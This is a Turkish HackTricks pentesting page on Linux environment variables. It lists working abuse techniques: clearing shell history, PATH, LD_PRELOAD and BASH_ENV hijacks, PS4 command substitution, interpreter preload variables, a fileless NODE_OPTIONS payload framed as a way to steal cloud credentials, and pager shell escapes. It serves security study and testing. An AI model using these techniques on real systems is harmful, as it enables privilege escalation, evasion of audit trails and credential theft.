# Linux Ortam Değişkenleri

{{#include ../../banners/hacktricks-training.md}}

## Global değişkenler

Global değişkenler **alt süreçler** tarafından devralınır.

Şunları yaparak mevcut oturumunuz için bir global değişken oluşturabilirsiniz:
```bash
export MYGLOBAL="hello world"
echo $MYGLOBAL #Prints: hello world
```
Bu değişkene mevcut oturumlarınız ve bunların alt süreçleri tarafından erişilebilir.

Bir değişkeni şu şekilde **kaldırabilirsiniz**:
```bash
unset MYGLOBAL
```
## Yerel değişkenler

**Yerel değişkenlere** yalnızca **mevcut shell/script** tarafından **erişilebilir**.
```bash
LOCAL="my local"
echo $LOCAL
unset LOCAL
```
## Mevcut değişkenleri listele
```bash
set
env
printenv
cat /proc/$$/environ
cat /proc/`python -c "import os; print(os.getppid())"`/environ
```
`/proc/*/environ` içeriği **NUL karakterleriyle ayrılmıştır**, bu nedenle bu varyantların okunması genellikle daha kolaydır:
```bash
tr '\0' '\n' </proc/$$/environ | sort -u
tr '\0' '\n' </proc/<PID>/environ | sort -u
```
**credentials** veya miras alınan ortamlar içindeki **interesting service configuration** bilgilerini arıyorsanız, ayrıca [Linux Post Exploitation](../post-exploitation/linux-post-exploitation/README.md) bölümünü de kontrol edin.

## Yaygın değişkenler

Kaynak: [https://geek-university.com/linux/common-environment-variables/](https://geek-university.com/linux/common-environment-variables/).<sup>[[5]](#references)</sup>

- **DISPLAY** – **X** tarafından kullanılan display. Bu değişken genellikle **:0.0** olarak ayarlanır; bu, mevcut bilgisayardaki ilk display anlamına gelir.
- **EDITOR** – kullanıcının tercih ettiği metin editörü.
- **HISTFILESIZE** – history dosyasında bulunan satırların maksimum sayısı.
- **HISTSIZE** – kullanıcı oturumunu sonlandırdığında history dosyasına eklenen satır sayısı.
- **HOME** – home dizininiz.
- **HOSTNAME** – bilgisayarın hostname'i.
- **LANG** – mevcut diliniz.
- **MAIL** – kullanıcının mail spool konumu. Genellikle **/var/spool/mail/USER**.
- **MANPATH** – manual sayfaları için aranacak dizinlerin listesi.
- **OSTYPE** – işletim sisteminin türü.
- **PS1** – bash'teki varsayılan prompt.
- **PATH** – yalnızca dosyanın adını belirterek ve relative veya absolute path kullanmadan çalıştırmak istediğiniz binary dosyalarını içeren tüm dizinlerin path bilgisini tutar.
- **PWD** – mevcut çalışma dizini.
- **SHELL** – mevcut command shell'in path'i (örneğin, **/bin/bash**).
- **TERM** – mevcut terminal türü (örneğin, **xterm**).
- **TZ** – time zone'unuz.
- **USER** – mevcut username'iniz.

## hacking için ilginç değişkenler

Her değişken aynı derecede kullanışlı değildir. Offensive perspective açısından, **search paths**, **startup files**, **dynamic linker behavior** veya **audit/logging** özelliklerini değiştiren değişkenlere öncelik verin.

### **HISTFILESIZE**

**Oturumunuzu sonlandırdığınızda**, **history dosyasının** (\~/.bash_history) **0 satıra kırpılması** için **bu değişkenin değerini 0 olarak değiştirin**.
```bash
export HISTFILESIZE=0
```
### **HISTSIZE**

Komutların **bellek içi geçmişte tutulmaması** ve **geçmiş dosyasına** (\~/.bash_history) geri yazılmaması için bu değişkenin **değerini 0** olarak değiştirin.
```bash
export HISTSIZE=0
```
### **HISTCONTROL**

**Bu değişkenin değeri `ignorespace` veya `ignoreboth` olarak ayarlanmışsa**, başına fazladan bir boşluk eklenen herhangi bir command history'ye kaydedilmez.
```bash
export HISTCONTROL=ignorespace
```

```bash
$ echo "to save or"
$  echo "not to save"
```
### **HISTFILE**

**history file**'ı **`/dev/null`**'a yönlendirin veya tamamen kaldırın. Bu, yalnızca history boyutunu değiştirmekten genellikle daha güvenilirdir.
```bash
export HISTFILE=/dev/null
unset HISTFILE
```
### http_proxy & https_proxy

İşlemler, **proxy** üzerinden http veya https ile internete bağlanmak için burada tanımlanan **proxy**'yi kullanır.
```bash
export http_proxy="http://10.10.10.10:8080"
export https_proxy="http://10.10.10.10:8080"
```
### all_proxy & no_proxy

- `all_proxy`: bunu destekleyen araçlar/protokoller için varsayılan proxy.
- `no_proxy`: doğrudan bağlanması gereken bypass listesi (host'lar/domain'ler/CIDR'ler).
```bash
export all_proxy="socks5h://10.10.10.10:1080"
export no_proxy="localhost,127.0.0.1,.corp.local,10.0.0.0/8"
```
Hem küçük harf hem de büyük harf varyantları, kullanılan araca bağlı olarak kullanılabilir (`http_proxy`/`HTTP_PROXY`, `no_proxy`/`NO_PROXY`).

### SSL_CERT_FILE & SSL_CERT_DIR

Process'ler **bu ortam değişkenlerinde** belirtilen sertifikalara güvenecektir. Bu, **`curl`**, **`git`**, Python HTTP istemcileri veya paket yöneticileri gibi araçların saldırgan tarafından kontrol edilen bir CA'ya güvenmesini sağlamak için kullanışlıdır (örneğin, bir interception proxy'sinin meşru görünmesini sağlamak için).
```bash
export SSL_CERT_FILE=/path/to/ca-bundle.pem
export SSL_CERT_DIR=/path/to/ca-certificates
```
### **PATH**

Ayrıcalıklı bir wrapper/script komutları **absolute paths** olmadan çalıştırıyorsa, `PATH` içindeki attacker-controlled ilk directory kazanır. Bu, `sudo`, cron jobs, shell wrappers ve özel SUID helpers içindeki birçok **PATH hijack** işleminin temel primitive'idir. `env_keep+=PATH`, zayıf `secure_path` veya `tar`, `service`, `cp`, `python` gibi komutları adlarıyla çağıran wrapper'ları arayın.
```bash
mkdir -p /dev/shm/bin
cat > /dev/shm/bin/tar <<'EOF'
#!/bin/sh
echo '[+] PATH hijack reached' >&2
id
EOF
chmod +x /dev/shm/bin/tar
PATH=/dev/shm/bin:$PATH vulnerable-wrapper
```
Tam ayrıcalık yükseltme zincirleri için `PATH` istismarlarını inceleyin: [Linux Privilege Escalation](linux-privilege-escalation/README.md).

### **HOME & XDG_CONFIG_HOME**

`HOME` yalnızca bir dizin referansı değildir: birçok araç **dotfiles**, **plugins** ve **per-user configuration** öğelerini `$HOME` veya `$XDG_CONFIG_HOME` üzerinden otomatik olarak yükler. Ayrıcalıklı bir iş akışı bu değerleri koruyorsa, **config injection** işlemi binary hijacking işleminden daha kolay olabilir.
```bash
export HOME=/dev/shm/fakehome
export XDG_CONFIG_HOME=/dev/shm/fakehome/.config
mkdir -p "$XDG_CONFIG_HOME"
```
İlgi çekici hedefler arasında `.gitconfig`, `.wgetrc`, `.curlrc`, `.inputrc`, `.pythonrc.py` ve `.terraformrc` gibi araca özgü dosyalar bulunur.

### **LD_PRELOAD, LD_LIBRARY_PATH & LD_AUDIT**

Bu değişkenler **dynamic linker**'ı etkiler:

- `LD_PRELOAD`: Ek shared object'lerin önce yüklenmesini zorlar.
- `LD_LIBRARY_PATH`: Kütüphane arama dizinlerini öne ekler.
- `LD_AUDIT`: Kütüphane yüklemelerini ve symbol resolution işlemlerini gözlemleyen auditor kütüphanelerini yükler.

Ayrıcalıklı bir komut bu değişkenleri koruyorsa, **hooking**, **instrumentation** ve **privilege escalation** için son derece değerlidirler. **secure-execution** modunda (`AT_SECURE`, örneğin setuid/setgid/capabilities), loader bu değişkenlerin çoğunu kaldırır veya kısıtlar. Ancak erken loader aşamasındaki parser bug'ları hâlâ yüksek etkiye sahiptir; çünkü hedef programdan **önce** çalışırlar.<sup>[[2]](#references)</sup>
```bash
env | grep -E '^LD_'
ldso=$(ls /lib64/ld-linux-*.so.* /lib/*-linux-gnu/ld-linux-*.so.* 2>/dev/null | head -n1)
"$ldso" --list-diagnostics /bin/true | head
"$ldso" --list-tunables /bin/true | head
```
### **GLIBC_TUNABLES**

`GLIBC_TUNABLES`, glibc'nin erken davranışını (örneğin allocator tunables) değiştirir ve exploit lab'lerinde oldukça kullanışlıdır. **Dynamic loader** bu değişkeni çok erken ayrıştırdığı için güvenlik açısından da önem taşır. 2023'teki **Looney Tunables** bug'ı, loader tarafından ayrıştırılan tek bir environment variable'ın SUID programlarına karşı **yerel ayrıcalık yükseltme primitive'i** haline gelebileceğini hatırlattı.<sup>[[6]](#references)</sup>
```bash
GLIBC_TUNABLES=glibc.malloc.tcache_count=0 ./binary
```
### **BASH_ENV & ENV**

**Bash** **interaktif olmayan** şekilde başlatılırsa hedef script'i çalıştırmadan önce `BASH_ENV` değişkenini kontrol eder ve belirtilen dosyayı source eder. Bash `sh` olarak çağrıldığında veya POSIX tarzı interaktif modda çalıştırıldığında `ENV` de kontrol edilebilir. Bu, environment saldırganın kontrolündeyse bir shell wrapper'ı code execution'a dönüştürmenin klasik bir yoludur.
```bash
cat > /tmp/pre.sh <<'EOF'
echo '[+] sourced before the target script'
EOF
BASH_ENV=/tmp/pre.sh bash -c 'echo target'
```
Bash, **gerçek/etkin kimlikler** farklı olduğunda bu startup files dosyalarını yok sayar; `-p`, etkin kimliği korur ancak bu startup files dosyalarını etkinleştirmez; bu nedenle kesin davranış, wrapper'ın shell'i nasıl çağırdığına bağlıdır. Bash'i başlatmadan **önce** `setuid()`/`setgid()` çağıran privileged wrapper'lara dikkat edin: Kimlikler yeniden eşleştiğinde Bash, aksi durumda yok sayacağı `BASH_ENV`, `ENV` ve ilgili shell state değerlerine güvenebilir.<sup>[[1]](#references)</sup>

### **PS4 + SHELLOPTS (xtrace)**

Bash, **xtrace** etkin olarak çalıştığında `PS4` değerini genişletir ve her izlenen komuttan önce yazdırır. `PS4`, prompt gibi genişletilir; bu nedenle içindeki bir **command substitution** çalıştırılır. Kritik nokta şudur: xtrace, ortamdan yalnızca `SHELLOPTS=xtrace` export edilerek etkinleştirilebilir — komut satırında `-x` belirtilmesi gerekmez — dolayısıyla kurbanın çalıştırdığı herhangi bir Bash script'i code execution'a dönüşür.<sup>[[7]](#references)</sup>
```bash
echo 'echo target' > /tmp/victim.sh

# Pure environment-variable injection (no -x flag)
SHELLOPTS=xtrace PS4='$(id > /tmp/ps4-executed)' bash /tmp/victim.sh
cat /tmp/ps4-executed

# Same primitive when a job is run with debugging enabled
PS4='$(touch /tmp/ps4-x)' bash -x /tmp/victim.sh
```
`PS4`, xtrace etkin olana kadar hiçbir şey yapmaz (`SHELLOPTS=xtrace`, `set -x` veya `bash -x`) ve Bash, `BASH_ENV` ile aynı şekilde ayrıcalıklı/setuid bağlamlarda `SHELLOPTS` değişkenini kaldırır.

### **PYTHONPATH, PYTHONHOME, PYTHONSTARTUP, PYTHONINSPECT & PYTHONBREAKPOINT**

Bu değişkenler Python'ın nasıl başlatılacağını değiştirir:

- `PYTHONPATH`: import arama yollarını öne ekler.
- `PYTHONHOME`: standart kütüphane ağacının konumunu değiştirir.
- `PYTHONSTARTUP`: etkileşimli istemden önce bir dosya çalıştırır.
- `PYTHONINSPECT=1`: bir script tamamlandıktan sonra etkileşimli moda geçer.
- `PYTHONBREAKPOINT`: kod `breakpoint()` işlevine ulaştığında çağrılan (`package.module.callable`) ve modülü import edilen callable.<sup>[[8]](#references)</sup>

Bunlar, Python'ı kontrol edilebilir bir ortamla çağıran bakım script'lerine, debugger'lara, shell'lere ve wrapper'lara karşı kullanışlıdır. `python -E` ve `python -I`, tüm `PYTHON*` değişkenlerini yok sayar.
```bash
mkdir -p /tmp/pylib
printf 'print("owned from PYTHONPATH")\n' > /tmp/pylib/htmod.py
PYTHONPATH=/tmp/pylib python3 -c 'import htmod'
PYTHONPATH=/tmp/pylib python3 -I -c 'import htmod'   # ignored in isolated mode

# PYTHONBREAKPOINT: runs when the target reaches breakpoint()
printf 'import sys\nbreakpoint(*sys.argv[1:])\n' > /tmp/bp.py
PYTHONBREAKPOINT='os.system' python3 /tmp/bp.py 'id'   # requires the code to hit breakpoint()
```
Yakın zamanda gerçek dünyadan bir örnek, Ubuntu/Debian sistemlerindeki 2024 **needrestart** LPE vakasıydı: root-owned scanner, ayrıcalıksız bir process'in `PYTHONPATH` değerini `/proc/<PID>/environ` üzerinden kopyaladı ve ardından Python'ı çalıştırdı. Yayımlanan exploit, saldırganın kontrolündeki path'e `importlib/__init__.so` yerleştirdi; böylece Python, helper'ın hard-coded script'i önem kazanmadan önce, kendi initialization süreci sırasında saldırgan kodunu çalıştırdı.<sup>[[3]](#references)</sup>

### **PERL5OPT & PERL5LIB**

Perl'in de aynı derecede kullanışlı startup değişkenleri vardır:

- `PERL5LIB`: library directory'lerini prepend eder.
- `PERL5OPT`: switch'leri her `perl` command line'ındaymış gibi inject eder.

Bu, hedef script ilginç herhangi bir işlem yapmadan önce **automatic module loading** işlemini zorlayabilir veya interpreter davranışını değiştirebilir. Perl, **taint / setuid / setgid** context'lerinde bu değişkenleri yok sayar; ancak bunlar normal root-run wrapper'ları, CI job'larını, installer'ları ve özel sudoers rule'larını hâlâ büyük ölçüde etkiler.
```bash
mkdir -p /tmp/perllib
cat > /tmp/perllib/HT.pm <<'EOF'
package HT;
BEGIN { print "PERL5OPT_TRIGGERED\n" }
1;
EOF
PERL5LIB=/tmp/perllib PERL5OPT=-MHT perl -e 'print "target\n"'
```
### **NODE_OPTIONS**

`NODE_OPTIONS`, ortamı devralan her `node` process'ine **Node.js CLI flags** ekler. Bu, sonunda Node çağıran wrapper'lara, CI job'larına, Electron helper'larına ve sudo kurallarına karşı onu kullanışlı kılar. Offensively en ilgi çekici flag'ler genellikle şunlardır:

- `--require <file>`: hedef script'ten önce bir CommonJS dosyasını preload eder.
- `--import <module>`: hedef script'ten önce bir ES module'u preload eder.

Node, bazı tehlikeli flag'lerin `NODE_OPTIONS` içinde kullanılmasını reddeder; ancak `--require` ve `--import` açıkça izin verilen seçeneklerdir ve normal command-line argümanlarından **önce** işlenirler.<sup>[[4]](#references)</sup>
```bash
cat > /tmp/preload.js <<'EOF'
console.error('[+] NODE_OPTIONS preload reached')
EOF
NODE_OPTIONS='--require /tmp/preload.js' node -e 'console.log("target")'
```
#### `data:` URL ile dosyasız preload

Hedefte `NODE_OPTIONS` ayarlayabildiğiniz ancak **dosya yazamadığınız** durumlarda (salt okunur dosya sistemi, kısıtlı API, serverless runtime vb.), `--import` bir `data:text/javascript,` URL'sini kabul eder; böylece tüm payload doğrudan ortam değişkeninin içinde taşınır. JavaScript **tamamen URL-encoded** olmalıdır — Node değeri bir URL olarak ayrıştırır; bu nedenle herhangi bir ham boşluk (veya encode edilmemiş başka bir karakter) payload'ı keser ve `SyntaxError` oluşturur. Bu yöntem, `--import` seçeneğinin `NODE_OPTIONS` allowlist'inde bulunduğu Node 20.6+ sürümlerinde çalışır.<sup>[[4]](#references)</sup>
```bash
# fileless proof of execution (note: no raw spaces in the data URL)
NODE_OPTIONS='--import data:text/javascript,console.log(%22fileless_preload%22)' node -e 'console.log("target")'

# Real payload, URL-encoded (run a command / exfiltrate env vars)
PAYLOAD=$(python3 - <<'PY'
import urllib.parse
js = "import('child_process').then(cp=>console.log(cp.execSync('id').toString()))"
print("--import data:text/javascript," + urllib.parse.quote(js, safe=""))
PY
)
NODE_OPTIONS="$PAYLOAD" node -e 'console.log("target")'
```
> [!TIP]
> Bu, fonksiyonları Node çalıştıran **managed cloud runtime**'larda `NODE_OPTIONS` kontrolünü RCE'ye dönüştürmenin yaygın bir yoludur. Örneğin, yalnızca bir Lambda'nın yapılandırmasını (`lambda:UpdateFunctionConfiguration`, `iam:PassRole` veya code update olmadan) değiştirebilen bir saldırgan, fonksiyon içinde code çalıştırmak ve execution-role kimlik bilgilerini çalmak için `NODE_OPTIONS=--import data:text/javascript,<payload>` enjekte edebilir. Enjekte edilen module, handler'dan **önce** çalışır; handler daha sonra normal şekilde çalışmaya devam eder.

`NODE_OPTIONS` değerini dolaylı olarak ayarlayan remote gadget chain'ler (örneğin, prototype-pollution ile RCE) için [bu diğer sayfaya](../../pentesting-web/deserialization/nodejs-proto-prototype-pollution/prototype-pollution-to-rce.md) bakın.

### **RUBYLIB & RUBYOPT**

Ruby, aynı startup abuse sınıfını sunar:

- `RUBYLIB`: Ruby'nin load path'ine dizinleri öne ekler.
- `RUBYOPT`: Her `ruby` invocation'ına `-r` gibi command-line seçenekleri enjekte eder.
```bash
mkdir -p /tmp/rubylib
printf 'warn "[+] RUBYOPT preload reached"\n' > /tmp/rubylib/ht.rb
RUBYLIB=/tmp/rubylib RUBYOPT='-rht' ruby -e 'puts :target'
```
2024 **needrestart** güvenlik açıkları bunun yalnızca bir lab tekniği olmadığını gösterdi: `PYTHONPATH` abuse'a karşı vulnerable olan aynı root-owned helper, attacker-controlled bir `RUBYLIB` kullanarak Ruby çalıştırmaya ve attacker directory içinden `enc/encdb.so` yüklemeye de zorlanabiliyordu.<sup>[[3]](#references)</sup>

### **VIMINIT & EXINIT**

Vim/Neovim, normal bir startup sırasında `VIMINIT` içinde (veya fallback olarak `EXINIT` içinde) bulunan Ex commands'ı çalıştırır. Ex commands, `:!cmd` ve `:call system(...)` içerir; bu nedenle variable'ı kontrol etmek, bir victim Vim'i her açtığında (root `sudo vim`, `crontab -e`, `visudo`, `$EDITOR` başlatan `git`/`less` vb.) code execution sağlar.<sup>[[9]](#references)</sup>
```bash
echo hi > /tmp/victim.txt
printf ':qa!\n' | VIMINIT='silent! !touch /tmp/vim-executed' vim /tmp/victim.txt
test -e /tmp/vim-executed && echo 'VIMINIT executed'
```
Batch mode (`vim -es`/`-Es`) bu değişkenleri atlar, ancak normal etkileşimli başlangıç bunları çalıştırır.

### **PowerShell (pwsh): PSModulePath, DOTNET_STARTUP_HOOKS ve CLR profiler**

PowerShell Core (`pwsh`) Linux/macOS (ve Windows) üzerinde çalışır ve bir **.NET uygulamasıdır**; bu nedenle çeşitli environment variable'lar, devralınmış bir environment ile yapılan her `pwsh` çağrısını code execution'a dönüştürebilir — cron/systemd işleri, CI runner'ları ve `pwsh` çalıştıran ayrıcalıklı wrapper'lara karşı kullanışlıdır.

- `PSModulePath`: PowerShell, bu listedeki her directory'de `.psd1`/`.psm1` modüllerini recursively arar ve export ettiği bir command'e ilk kez referans verildiğinde bunlardan birini **auto-load** eder. Bir directory'yi listenin başına eklediğinizde modülünüzün top-level code'u import sırasında çalışır; resolution sırası *Alias → Function → Cmdlet* olduğundan, export edilmiş bir function victim'ın çağırdığı yerleşik bir cmdlet'i shadow edebilir.<sup>[[10]](#references)</sup>
- `XDG_CONFIG_HOME`: başlangıçta çalıştırılan `powershell/Microsoft.PowerShell_profile.ps1` dosyasının konumunu değiştirir (`-NoProfile` kullanılmadığı sürece).
- `DOTNET_STARTUP_HOOKS`: `Main`'den önce `StartupHook.Initialize()` çalıştırılan managed assembly'dir (her .NET uygulaması tarafından paylaşılır).
- `CORECLR_ENABLE_PROFILING=1` + `CORECLR_PROFILER={guid}` + `CORECLR_PROFILER_PATH=/path/evil.so`: CLR profiling API, başlangıçta attacker library'sini process'e yükler (path variable'ları registry'ye göre önceliklidir; `DOTNET_*` daha yeni alias'tır). Windows PowerShell 5.1'de (.NET Framework) `COR_ENABLE_PROFILING`/`COR_PROFILER`/`COR_PROFILER_PATH` kullanın. MITRE ATT&CK T1574.012.<sup>[[11]](#references)</sup>
```bash
# PSModulePath module auto-load hijack
mkdir -p /tmp/evil/Hijack
printf 'New-Item -ItemType File /tmp/ps-mod-exec -Force|Out-Null\nfunction Invoke-Report{}\nExport-ModuleMember -Function Invoke-Report\n' > /tmp/evil/Hijack/Hijack.psm1
printf "@{ModuleVersion='1.0';RootModule='Hijack.psm1';FunctionsToExport=@('Invoke-Report')}\n" > /tmp/evil/Hijack/Hijack.psd1
PSModulePath="/tmp/evil:$PSModulePath" pwsh -Command 'Invoke-Report'
test -e /tmp/ps-mod-exec && echo 'PSModulePath auto-load executed'
```
Windows'ta `PSExecutionPolicyPreference=Bypass`, ek olarak "unsigned scripts blocked" güvenlik önlemini kaldırır; böylece yerleştirilmiş bir profile/module gerçekten çalışır. Tam PoC'ler için özel sayfaya bakın:

{{#ref}}
../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-powershell-applications-injection.md
{{#endref}}

### **PAGER, MANPAGER, GIT_PAGER, GIT_EDITOR & LESSOPEN**

Bazı araçlar environment'dan yalnızca bir path okumaz; değeri bir **shell**'e, **editor**'e veya **input preprocessor**'a iletir. Bu nedenle ayrıcalıklı bir wrapper `git`, `man`, `less` veya benzer text viewer'ları çalıştırdığında aşağıdaki değişkenler özellikle ilgi çekicidir:

- `PAGER`, `MANPAGER`, `GIT_PAGER`: pager command'ını seçer.
- `GIT_EDITOR`, `VISUAL`, `EDITOR`: genellikle argümanlarla birlikte editor command'ını seçer.
- `LESSOPEN`, `LESSCLOSE`: `less` bir dosya açtığında çalışan pre/post-processor'ları tanımlar.
```bash
PAGER='sh -c "exec sh 0<&1 1>&1"' man man

cat > /tmp/lesspipe.sh <<'EOF'
#!/bin/sh
echo '[+] LESSOPEN triggered' >&2
cat "$1"
EOF
chmod +x /tmp/lesspipe.sh
LESSOPEN='|/tmp/lesspipe.sh %s' less /etc/hosts
```
Git ayrıca diske dokunmadan `GIT_CONFIG_COUNT`, `GIT_CONFIG_KEY_<n>` ve `GIT_CONFIG_VALUE_<n>` aracılığıyla yalnızca env ile config injection özelliğini destekler:
```bash
GIT_CONFIG_COUNT=1 \
GIT_CONFIG_KEY_0=core.pager \
GIT_CONFIG_VALUE_0='sh -c "exec sh 0<&1 1>&1"' \
git -p help
```
Post-exploitation perspective açısından, devralınan environment'ların genellikle **credentials**, **proxy settings**, **service tokens** veya **cloud keys** içerdiğini de unutmayın. `/proc/<PID>/environ` ve `systemd` `Environment=` hunting için [Linux Post Exploitation](../post-exploitation/linux-post-exploitation/README.md) sayfasına bakın.

### PS1

Prompt'unuzun görünümünü değiştirin.

[**This is an example**](https://gist.github.com/carlospolop/43f7cd50f3deea972439af3222b68808)

Root:

![PERL5OPT & PERL5LIB - PS1: Bu bir örnektir](<../images/image (897).png>)

Normal kullanıcı:

![PERL5OPT & PERL5LIB - PS1: Arka planda çalışan bir, iki ve üç iş](<../images/image (740).png>)

Arka planda çalışan bir, iki ve üç iş:

![PERL5OPT & PERL5LIB - PS1: Arka planda çalışan bir, iki ve üç iş](<../images/image (145).png>)

Arka planda çalışan bir iş, durdurulmuş bir iş ve son komut doğru şekilde tamamlanmadı:

![PERL5OPT & PERL5LIB - PS1: Arka planda çalışan bir iş, durdurulmuş bir iş ve son komut doğru şekilde tamamlanmadı](<../images/image (715).png>)

## References

- [1] [GNU Bash Manual - Bash Başlangıç Dosyaları](https://www.gnu.org/software/bash/manual/html_node/Bash-Startup-Files.html)
- [2] [ld.so(8) - Linux kılavuz sayfası](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [3] [Qualys - needrestart'teki LPE'ler](https://www.qualys.com/2024/11/19/needrestart/needrestart.txt)
- [4] [Node.js CLI dokümantasyonu - `NODE_OPTIONS`](https://nodejs.org/api/cli.html)
- [5] [Yaygın environment değişkenleri - Geek University](https://geek-university.com/linux/common-environment-variables/)
- [6] [CVE-2023-4911: Looney Tunables - glibc'nin ld.so'sunda Local Privilege Escalation - Qualys](https://blog.qualys.com/vulnerabilities-threat-research/2023/10/03/cve-2023-4911-looney-tunables-local-privilege-escalation-in-the-glibcs-ld-so)
- [7] [GNU Bash Manual - Bash Değişkenleri (`PS4`) ve Set Builtin'i (`xtrace`/`SHELLOPTS`)](https://www.gnu.org/software/bash/manual/html_node/Bash-Variables.html)
- [8] [PEP 553 - Yerleşik breakpoint() ve PYTHONBREAKPOINT](https://peps.python.org/pep-0553/)
- [9] [Vim dokümantasyonu - starting.txt (`VIMINIT`, `EXINIT`)](https://vimhelp.org/starting.txt.html#initialization)
- [10] [about_PSModulePath ve PowerShell module auto-loading](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_psmodulepath)
- [11] [.NET debugging ve profiling config settings (`CORECLR_`/`DOTNET_`/`COR_` profiler variables)](https://learn.microsoft.com/en-us/dotnet/core/runtime-config/debugging-profiling)
{{#include ../../banners/hacktricks-training.md}}
